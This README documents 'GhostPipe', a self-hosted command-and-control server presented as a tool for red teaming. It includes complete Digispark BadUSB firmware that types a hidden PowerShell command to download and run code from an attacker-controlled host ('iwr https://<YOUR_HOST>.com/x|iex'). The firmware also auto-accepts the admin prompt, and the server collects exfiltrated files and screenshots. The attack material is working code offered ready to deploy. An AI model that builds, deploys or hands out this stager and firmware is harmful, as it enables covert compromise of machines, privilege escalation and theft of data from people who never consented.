# GhostPipe C2 Server

GhostPipe is a minimal, simple, self-hosted Command-and-Control (C2) framework designed for red teaming and ethical hacking exercises.

It allows you to manage BadUSB PowerShell-based payloads, collect exfiltrated data, and operate via a responsive web UI optimized for both desktop and mobile.

You install GhostPipe on any server, flash your Digispark or BadUSB device with a tiny PowerShell stub that simply downloads whatever lives at `/x`, and then point it at your GhostPipe URL. From the web UI you can add, edit, activate or deactivate payloads on the fly. Therefore, the next time your device plugs in it will fetch the newest script, and any data it POSTs back to /exfil (text, files or even screenshots) is automatically collected, decoded and presented in your dashboard for review.


## 🔑 Features

  * Secure login with username/password (bcrypt-hashed)
  * Change username & password
  * Automatic session invalidation on password change
  * Create, edit, delete PowerShell payloads
  * Activate/deactivate payloads (single active payload at a time)
  * Export/import payloads as JSON
  * Collect exfiltrated data and save in database
  * Embedded thumbnails for screenshots


## 🛠️ Requirements

* Python 3.8+
* Flask 3.x
* Flask-Login
* Flask-Bcrypt
* SQLite3

Install dependencies with:

```bash
pip install flask flask-login flask-bcrypt
```


## ⚙️ Installation & Configuration

1. **Clone the repo**

```bash
git clone https://github.com/Nickguitar/GhostPipe.git
cd GhostPipe
```

2. **Configure environment variables** (optional — defaults shown):
```bash
export GHOSTPIPE_DB=c2.db
export GHOSTPIPE_SECRET=mysecretkey
export GHOSTPIPE_USER=admin
export GHOSTPIPE_PASS=Gh0stP!p3
```

3. **Initialize database and Start the server**:

```bash
python main.py
```

4. **Open your browser** at `http://localhost:8000/` and log in with your credentials.

## 🚀 Usage

* Flash the badUSB with the first stage code. This should be done only once to set up the USB device. See next section.
* First Log in with `admin:Gh0stP!p3`, and change password.
* Add Payload: Go to “Payloads” → Add ➕, enter a name and your PowerShell script, then Save.
* Import: You can also import a pre-built list of payloads. [See some examples here](EXAMPLES.md).
* Activate/Deactivate: Toggle the active payload via the toggle icons in the Actions column. The active payload is the one to be run when the badUSB script is executed.
* View Exfiltrated data: Click “View Exfiltrated Data” to see collected outputs from successful executions.
* Settings: Update username/password under the ⚙️ Settings button.

## Flashing the badUSB with first stage

Paste the following code into [Duckify](https://duckify.huhn.me/), changing `<YOUR_HOST>:8000` to your public facing URL with GhostPipe. Make sure to select correctly the keyboard layout, otherwise it will break the slashes when typing it:

```
STRING powershell -NoP -NonI -WindowStyle hidden -Exec Bypass iwr https://<YOUR_HOST>.com/x|iex
```

It should generate the constant `const uint8_t key_arr_0[] PROGMEM = {...}`. Copy it and replace in the following code. 

```cpp
#include "DigiKeyboard.h"

// powershell -NoP -NonI -WindowStyle hidden -Exec Bypass iwr https://<YOUR_HOST>.com/x|iex
// CHANGE THIS:
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,45, 2,17, 0,18, 2,19, 0,44, 0,45, 2,17, 0,18, 0,17, 2,12, 0,44, 0,45, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 2,22, 0,23, 0,28, 0,15, 0,8, 0,44, 0,11, 0,12, 0,7, 0,7, 0,8, 0,17, 0,44, 0,45, 2,8, 0,27, 0,8, 0,6, 0,44, 2,5, 0,28, 0,19, 0,4, 0,22, 0,22, 0,44, 0,12, 0,26, 0,21, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,56, 64,20, 64,20, 2,54, 2,28, 2,18, 2,24, 2,21, 2,45, 2,11, 2,18, 2,22, 2,23, 2,55, 0,55, 0,6, 0,18, 0,16, 64,20, 0,27, 2,100, 0,12, 0,8, 0,27};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT);
    digitalWrite(1, LOW);
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
    DigiKeyboard.delay(1000);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(700);
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell -NoP -NonI -WindowStyle hidden...
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(40, 3); // CTRL SHIFT ENTER (execute as admin)
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(28, 4); // ALT y
    DigiKeyboard.delay(200);
    digitalWrite(1, HIGH); // Turn LED on
}

void loop() {}
```